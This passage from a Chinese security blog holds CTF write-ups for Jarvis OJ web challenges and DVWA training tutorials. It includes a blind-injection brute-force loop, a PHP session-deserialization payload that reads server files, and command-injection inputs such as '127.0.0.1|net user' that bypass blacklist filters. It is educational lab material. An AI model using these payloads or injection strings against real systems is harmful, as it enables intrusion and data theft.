requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">	if &apos;密码错误&apos; in r.text:</span><br><span class="line"></span><br><span class="line">		return 1</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line"></span><br><span class="line">		return 0</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url,data=data)</span><br><span class="line">	if &apos;密码错误&apos; in r.text:</span><br><span class="line">		return 1</span><br><span class="line">	else:</span><br><span class="line">		return 0</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for num in range(1,100):</span><br><span class="line">	for asc in range(1,255):</span><br><span class="line">		get = test(num,asc)</span><br><span class="line">		if get == 0:</span><br><span class="line">			flag += chr(asc)</span><br><span class="line">			print(flag)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure></p>
+<p>得到的username为admin，得到的password是经过md5加密的，解密一下就好了，在登录框输入得到flag</p>
+<h2 id="0x09-api调用"><a href="#0x09-api调用" class="headerlink" title="0x09 api调用"></a>0x09 api调用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请设法获得目标机器/home/ctf/flag.txt中的flag值。</span><br><span class="line"></span><br><span class="line">题目入口：http://web.jarvisoj.com:9882/</span><br></pre></td></tr></table></figure>
+<p>查看源代码<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/@A~E99T5U%5DZLD_$G%7BY%7B9J51.png" alt="image"></p>
+<p>据说是一种原理:xxe的漏洞<br><br><a href="http://bobao.360.cn/learning/detail/360.html" target="_blank" rel="noopener">在JSON中玩转XXE攻击 </a></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/_1%298E@%29%60Z%7D2DZQ0_WWJSZUH.png" alt="image"><br><br> Content-Type头被修改为application/xml，客户端会告诉服务器post过去的数据是XML格式的</p>
+<p> 这里比较简洁，是一个新姿势，稍后会博客写关于xxe漏洞的文章</p>
+<h2 id="0x10-PHPINFO"><a href="#0x10-PHPINFO" class="headerlink" title="0x10 PHPINFO"></a>0x10 PHPINFO</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目入口：http://web.jarvisoj.com:32784/</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br></pre></td></tr></table></figure>
+<p>很明显的PHP Session 反序列化漏洞</p>
+<p>根据代码的?phpinfo我们可以看到 <br></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/KE%25~M1ME~CU%281$~HX_G2%29HA.png" alt="image"></p>
+<ul>
+<li><p>首先第一行的session.serialize_handler默认为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
+</li>
+<li><p>第三行的ession.upload_progress.enabled为On<br><img src="http://p1vrkwaxt.bkt.clouddn.com/XTM%25ICEV1TL4W2P1_3I%7D_9O.png" alt="image"></p>
+</li>
+</ul>
+<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
+<p>但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。</p>
+<p>其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题</p>
+<p>思路很明显了，我们需要构造一个上传和post同时进行的情况，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;sdas&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这些代码在本地搞，然后抓包，修改filename的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__FILE__ :被称为PHP魔术常量,返回当前执行PHP脚本的完整路径和文件名,包含一个绝对路径</span><br><span class="line"></span><br><span class="line">dirname(__FILE__) 函数返回的是脚本所在在的路径。</span><br></pre></td></tr></table></figure></p>
+<p>下面构造序列化值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&apos;print_r(scandir(dirname(__FILE__)))&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">$a = &apos;|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:35:&quot;print_r(scandir(dirname(__FILE__)))&quot;;&#125;&apos;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>加上|,而且考虑到转义问题，最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/$PFB$5$SPEMDJM_%7D1~@%25K3Y.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>这条可以爆出当前目录</p>
+<p>最后通过file_get_contents()函数来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DVWA之Commad injection" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/DVWA之Commad injection/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/DVWA之Commad injection/">DVWA之 Command Injection</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>参考链接:<a href="http://www.freebuf.com/articles/web/116714.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/116714.html</a></p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>Command Injection(命令注入),指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。</p>
+<h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>服务器核心代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Windows </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // *nix </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback for the end user </span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>php_uname(mode)<br>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</li>
+<li>stristr(string,search,before_search),具体自己百度<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3>window和linux系统都可以用&amp;&amp;来执行多条命令<br>输入内容可以为</li>
+<li>127.0.0.1&amp;&amp;ls</li>
+<li>127.0.0.1&amp;&amp;whoami</li>
+<li>127.0.0.1&amp;&amp;net user</li>
+</ul>
+<p>下面图以第二个为例<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/JXA0WV3FP@ZQWREER%257CQER.png" alt="image"></p>
+<p>可以看到最下面爆出了当前使用用户</p>
+<h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line"></span><br><span class="line">    $substitutions = array( </span><br><span class="line"></span><br><span class="line">        &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist). </span><br><span class="line"></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Windows </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // *nix </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback for the end user </span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到增加了str_replace()函数，将&amp;&amp;和;这两个字符过滤成空字符了，但还是有些字符可以用，如&amp;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/1%5B@QK~JWJPI88GN%5BS4I_SL2.png" alt="image"></p>
+<p>这里注意&amp;与&amp;&amp;的区别:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command 1&amp;&amp;Command 2</span><br><span class="line"> </span><br><span class="line">(先执行Command 1，执行成功后执行Command 2，否则不执行Command 2)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command 1&amp;Command 2</span><br><span class="line"></span><br><span class="line">先执行Command 1，不管是否成功，都会执行Command 2</span><br></pre></td></tr></table></figure>
+<p>也可以用如下绕过(过滤成一个空白字符)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;;&amp;ipconfig</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/0CHXF8%7DD%25OAI6SWH%5B9Q%5DHZU.png" alt="image"></p>
+<p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。</p>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = trim($_REQUEST[ &apos;ip&apos; ]); </span><br><span class="line"></span><br><span class="line">    // Set blacklist </span><br><span class="line"></span><br><span class="line">    $substitutions = array( </span><br><span class="line"></span><br><span class="line">        &apos;&amp;&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;;&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;|  &apos; =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;-&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;$&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;(&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;)&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;`&apos;  =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">        &apos;||&apos; =&gt; &apos;&apos;, </span><br><span class="line"></span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist). </span><br><span class="line"></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Windows </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // *nix </span><br><span class="line"></span><br><span class="line">        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback for the end user </span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出，相比Medium级别的代码，High级别的代码进一步完善了黑名单，但由于黑名单机制的局限性，我们依然可以绕过。</p>
+<h2 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h2><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Command 1 | Command 2</span><br><span class="line"></span><br><span class="line">“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</span><br></pre></td></tr></table></figure>
+<p>参考链接:<a href="http://blog.sina.com.cn/s/blog_70bea87d010129dv.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_70bea87d010129dv.html</a></p>
+<p>输入如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|net user</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/4%5B$%6045X6%289GQR8U%5B%7BD7DU%5DP.png" alt="image"></p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ]  ) ) &#123; </span><br><span class="line"></span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line"></span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ &apos;ip&apos; ]; </span><br><span class="line"></span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    // Split the IP into 4 octects </span><br><span class="line"></span><br><span class="line">    $octet = explode( &quot;.&quot;, $target ); </span><br><span class="line"></span><br><span class="line">    // Check IF each octet is an integer </span><br><span class="line"></span><br><span class="line">    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // If all 4 octets are int&apos;s put the IP back together. </span><br><span class="line"></span><br><span class="line">        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; </span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command. </span><br><span class="line"></span><br><span class="line">        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; </span><br><span class="line"></span><br><span class="line">            // Windows </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        else &#123; </span><br><span class="line"></span><br><span class="line">            // *nix </span><br><span class="line"></span><br><span class="line">            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); </span><br><span class="line"></span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Feedback for the end user </span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123; </span><br><span class="line"></span><br><span class="line">        // Ops. Let the user name theres a mistake </span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line"></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先使用 stripslashes 转义反斜线后的字符串，然后恐怖的来了，将输入的字符串依据’.’号分隔开，然后依次判断每段是否为整数，如果是则执行命令，如果不是则直接报错退出。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/DVWA渗透训练/">DVWA渗透训练</a>
+    </div>
+
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DVWA之CSRF漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/DVWA之CSRF漏洞/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.539Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/DVWA之CSRF漏洞/">DVWA之CSRF</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>参考链接:<a href="http://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/118352.html</a></p>
+<h2 id="CSRF-跨站点请求伪造"><a href="#CSRF-跨站点请求伪造" class="headerlink" title="CSRF(跨站点请求伪造)"></a>CSRF(跨站点请求伪造)</h2><p>CSRF全称Cross-site request forgery，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<p>CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用</p>
